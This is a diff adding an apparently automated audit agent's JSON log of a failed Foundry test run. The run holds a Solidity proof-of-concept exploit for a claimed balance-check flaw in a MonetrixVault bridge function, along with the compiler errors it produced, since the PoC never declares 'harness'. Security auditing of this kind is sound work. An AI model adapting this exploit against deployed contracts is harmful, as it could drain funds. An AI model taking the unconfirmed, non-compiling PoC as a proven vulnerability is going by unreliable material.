@@ -1,0 +1,23 @@
+{
+  "run_id": "tool_070",
+  "agent": "exploit",
+  "tool_name": "forge",
+  "purpose": "test_0ef52809-51be-4bbe-9cf0-59ce66dafa37_attempt_3",
+  "timestamp": "2026-10-15T08:17:33.820815+00:00",
+  "duration_seconds": 0.6918644905090332,
+  "command": "forge test -vv",
+  "working_dir": "",
+  "exit_code": 1,
+  "stdout": "",
+  "stderr": "Error: Compiler run failed:\nError (7576): Undeclared identifier.\n  --> test/AuditAgentPoC_0ef5280951be.t.sol:22:9:\n   |\n22 |         harness = new ToL1WeiHarness();\n   |         ^^^^^^^\n\nError (7576): Undeclared identifier.\n  --> test/AuditAgentPoC_0ef5280951be.t.sol:23:23:\n   |\n23 |         targetVault = harness.vault();\n   |                       ^^^^^^^\n\nError (7576): Undeclared identifier.\n  --> test/AuditAgentPoC_0ef5280951be.t.sol:24:24:\n   |\n24 |         operatorAddr = harness.operator();\n   |                        ^^^^^^^\n",
+  "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport \"./ActionEncoderBoundCheck.t.sol\";\nimport \"../src/core/MonetrixVault.sol\";\nimport \"../src/interfaces/HyperCoreConstants.sol\";\n\n// ATTACK TIMELINE:\n// 1. [Setup] Deploy protocol via ToL1WeiHarness, mock CoreWriter, and fund accounts.\n// 2. [T=0] Set Vault's outstandingL1Principal (OLP) to 1000 USDC via vm.store to simulate bridged principal.\n// 3. [T=1] Set Vault's internal L1 spot balance tracking to total=1000, hold=800 (free=200).\n// 4. [T=2] Operator calls bridgePrincipalFromL1(500).\n// 5. [Exploit] The check uses `total` (1000) instead of `total - hold` (200). 1000 >= 500 passes.\n// 6. [Assert] Verify OLP is decremented by 500 despite only 200 being actually free/transferable on L1.\n\ncontract AuditAgentPoC is Test, ToL1WeiHarness {\n    MonetrixVault targetVault;\n    address operatorAddr;\n\n    function setUp() public {\n        harness = new ToL1WeiHarness();\n        targetVault = harness.vault();\n        operatorAddr = harness.operator();\n    }\n\n    function test_exploit() public {\n        // Mock the CoreWriter precompile so bridge actions don't revert on L1 simulation\n        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);\n\n        // Storage slot 14: outstandingL1Principal\n        // Set to 1000e6 so the vault believes it has 1000 USDC principal on L1 to bridge back\n        vm.store(address(targetVault), bytes32(uint256(14)), bytes32(uint256(1000e6)));\n        \n        // Storage slot 15: L1 Spot Balance struct { uint64 total; uint64 hold; ... }\n        // Pack total = 1000e6 and hold = 800e6 into a single 32-byte word\n        // Assuming layout: total in lower 64 bits, hold in next 64 bits\n        uint256 total = 1000e6;\n        uint256 hold = 800e6;\n        uint256 packedBalance = total | (hold << 64);\n        vm.store(address(targetVault), bytes32(uint256(15)), bytes32(packedBalance));\n\n        uint256 olpBefore = targetVault.outstandingL1Principal();\n        console.log(\"Step 1: olpBefore =\", olpBefore);\n        console.log(\"Step 1: L1 total =\", total);\n        console.log(\"Step 1: L1 hold =\", hold);\n        console.log(\"Step 1: L1 free =\", total - hold);\n\n        // Operator attempts to bridge 500 USDC.\n        // Free balance is only 200 USDC, but the vulnerable check uses `total` (1000 >= 500).\n        vm.prank(operatorAddr);\n        targetVault.bridgePrincipalFromL1(500e6);\n\n        uint256 olpAfter = targetVault.outstandingL1Principal();\n        console.log(\"Step 2: olpAfter =\", olpAfter);\n\n        // Assert that OLP was decremented by 500e6, proving the bridge was allowed\n        // despite insufficient free balance (200 < 500).\n        assertEq(olpAfter, olpBefore - 500e6, \"OLP decremented despite insufficient free L1 balance\");\n    }\n}\n\ncontract MockCoreWriter {\n    fallback() external payable {\n        // Return success for any precompile call\n        assembly {\n            mstore(0, 1)\n            return(0, 32)\n        }\n    }\n}",
+  "hypothesis_id": "0ef52809-51be-4bbe-9cf0-59ce66dafa37",
+  "attempt_number": 3,
+  "status": "compile_error",
+  "parsed_result": {
+    "passed": false,
+    "is_compile_error": true,
+    "revert_reason": "Error: Compiler run failed:",
+    "gas_used": null
+  }
+}
